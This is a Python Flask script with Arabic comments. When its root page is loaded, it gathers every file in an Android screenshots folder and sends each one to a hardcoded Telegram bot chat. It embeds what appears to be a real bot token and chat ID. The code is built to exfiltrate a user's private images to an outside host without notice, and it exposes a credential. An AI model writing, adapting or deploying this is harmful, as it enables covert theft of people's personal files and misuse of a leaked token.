import os
import telebot
from flask import Flask, render_template

# إعدادات بوت تلغرام
TELEGRAM_API_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'
CHAT_ID = '5152526784'  # يمكنك الحصول عليه باستخدام بوت @userinfobot أو عبر API

# تحديد المسار إلى مجلد الصور في هاتف الأندرويد
# في حالة الاتصال عبر USB مع تمكين الوصول إلى الملفات
ANDROID_PHONE_PATH = '/storage/emulated/0/Pictures/Screenshot'  # المسار المطلوب

# إنشاء كائن بوت باستخدام مكتبة telebot
bot = telebot.TeleBot(TELEGRAM_API_TOKEN)

app = Flask(__name__)

def send_file_to_telegram(file_path):
    """دالة لإرسال الملف إلى بوت تلغرام باستخدام مكتبة telebot"""
    try:
        # فتح الملف
        with open(file_path, 'rb') as file:
            # إرسال الملف إلى تلغرام
            bot.send_document(chat_id=CHAT_ID, document=file)
            return f"تم إرسال الملف {file_path} إلى تلغرام."
    except Exception as e:
        return f"حدث خطأ أثناء فتح الملف: {e}"

@app.route('/', methods=['GET'])
def index():
    """الرابط الرئيسي للموقع الذي سيقوم بسحب الملفات وإرسالها للبوت"""
    try:
        # التأكد من وجود المسار والتحقق من الملفات فيه
        if os.path.exists(ANDROID_PHONE_PATH) and os.path.isdir(ANDROID_PHONE_PATH):
            files = os.listdir(ANDROID_PHONE_PATH)
            if files:
                messages = []
                for file in files:
                    file_path = os.path.join(ANDROID_PHONE_PATH, file)
                    
                    # التأكد من أن الملف هو ملف وليس مجلدًا
                    if os.path.isfile(file_path):
                        message = send_file_to_telegram(file_path)
                        messages.append(message)
                return render_template('index.html', messages=messages)
            else:
                return render_template('index.html', messages=["لا توجد ملفات في المسار المحدد."])
        else:
            return render_template('index.html', messages=["المسار غير صحيح أو لا يوجد."])
    except Exception as e:
        return render_template('index.html', messages=[f"حدث خطأ: {str(e)}"])

if __name__ == '__main__':
    app.run(debug=True)
